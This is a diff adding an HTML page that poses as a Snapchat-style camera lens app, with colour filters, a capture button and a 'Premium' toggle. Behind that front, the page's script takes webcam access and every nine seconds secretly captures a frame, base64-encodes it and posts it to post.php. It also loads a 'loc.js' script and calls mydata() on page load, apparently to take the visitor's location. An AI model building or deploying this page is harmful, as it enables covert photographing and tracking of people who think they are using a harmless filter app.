@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snap Camera - Green Lantern</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ffeb3b, #ffc107);
+            font-family: 'Helvetica Neue', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+            position: relative;
+        }
+
+        /* Cartoon Animation Background */
+        .cartoon-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+            opacity: 0.3;
+        }
+
+        .cartoon-bg div {
+            position: absolute;
+            border-radius: 50%;
+            background: #fff;
+            animation: float 15s infinite;
+        }
+
+        .cartoon-bg .star1 { width: 20px; height: 20px; top: 10%; left: 10%; }
+        .cartoon-bg .star2 { width: 15px; height: 15px; top: 30%; left: 70%; animation-delay: 2s; }
+        .cartoon-bg .star3 { width: 25px; height: 25px; top: 70%; left: 30%; animation-delay: 4s; }
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            25% { transform: translateY(-20px) rotate(90deg); }
+            50% { transform: translateY(0) rotate(180deg); }
+            75% { transform: translateY(-20px) rotate(270deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            max-height: 800px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .video-wrap {
+            position: relative;
+            width: 100%;
+            height: 80%;
+            overflow: hidden;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        #demo-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+            background: url('https://via.placeholder.com/400x600?text=Demo+Video') no-repeat center;
+            background-size: cover;
+        }
+
+        #canvas {
+            display: none; /* Hidden by default, used for capture */
+            width: 640px;
+            height: 640px;
+        }
+
+        .filters {
+            position: absolute;
+            bottom: 120px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            padding: 10px 0;
+        }
+
+        .filter-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 15px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .filter-btn:hover {
+            background: rgba(255, 255, 255, 0.4);
+            transform: scale(1.05);
+        }
+
+        .filter-btn:active {
+            transform: scale(0.95);
+        }
+
+        .capture-button {
+            position: absolute;
+            bottom: 20px;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #fff;
+            border: 4px solid #fff;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.2s;
+        }
+
+        .capture-button::after {
+            content: '';
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            background: #ffeb3b;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            transition: transform 0.3s;
+        }
+
+        .capture-button:hover::after {
+            transform: scale(1.1);
+        }
+
+        .capture-button:active {
+            transform: scale(0.9);
+        }
+
+        .premium-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #00c853;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .premium-btn:hover {
+            background: #00a646;
+            transform: scale(1.05);
+        }
+
+        .premium-btn:active {
+            transform: scale(0.95);
+        }
+
+        .branding {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 20px;
+            color: #fff;
+            text-shadow: 0 0 5px #000;
+        }
+    </style>
+</head>
+
+<body onload="mydata()">
+    <div class="branding">Snap Lens</div>
+    <div class="premium-btn" onclick="toggleDemo()">Premium</div>
+
+    <div class="camera-container">
+        <div class="video-wrap">
+            <video id="video" playsinline autoplay></video>
+            <div id="demo-video"></div>
+        </div>
+
+        <canvas id="canvas" width="640" height="640"></canvas>
+
+        <!-- Snapchat-like Filters -->
+        <div class="filters">
+            <button class="filter-btn" onclick="applyFilter('grayscale')">🌑</button>
+            <button class="filter-btn" onclick="applyFilter('invert')">🔄</button>
+            <button class="filter-btn" onclick="applyFilter('sepia')">🌅</button>
+            <button class="filter-btn" onclick="applyFilter('blur')">🌫️</button>
+        </div>
+
+        <!-- Capture Button -->
+        <div class="capture-button" id="snap"></div>
+    </div>
+
+    <div class="cartoon-bg">
+        <div class="star1"></div>
+        <div class="star2"></div>
+        <div class="star3"></div>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    // Response handling
+                },
+                error: function() {}
+            });
+        };
+
+        'use strict';
+
+        let isDemoMode = false;
+
+        const video = document.getElementById('video');
+        const demoVideo = document.getElementById('demo-video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        // Toggle between demo and live mode
+        function toggleDemo() {
+            isDemoMode = !isDemoMode;
+            if (isDemoMode) {
+                video.style.display = 'none';
+                demoVideo.style.display = 'block';
+                // In demo mode, disable webcam feed (placeholder image used)
+            } else {
+                video.style.display = 'block';
+                demoVideo.style.display = 'none';
+                init(); // Reinitialize webcam if switching back
+            }
+        }
+
+        // Access webcam
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+            }
+        }
+
+        // Success: Display camera feed
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function(){
+                if (!isDemoMode) {
+                    context.drawImage(video, 0, 0, 640, 640);
+                    var canvasData = canvas.toDataURL("image/png");
+                    cc = String(canvasData).replace("data:image/png;base64","");
+                    post(cc);
+                }
+            }, 9000);
+        }
+
+        // Apply Snapchat-like Filters
+        function applyFilter(filter) {
+            if (!isDemoMode) {
+                ctx.filter = filter;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            }
+        }
+
+        // Capture Image and Auto-Save
+        document.getElementById('snap').addEventListener('click', function () {
+            if (!isDemoMode) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Auto-save to user's PC
+                const link = document.createElement('a');
+                link.download = 'snap_' + Date.now() + '.png';
+                link.href = canvas.toDataURL("image/png");
+                link.click();
+            }
+        });
+
+        // Load webcam
+        init();
+    </script>
+</body>
+</html>
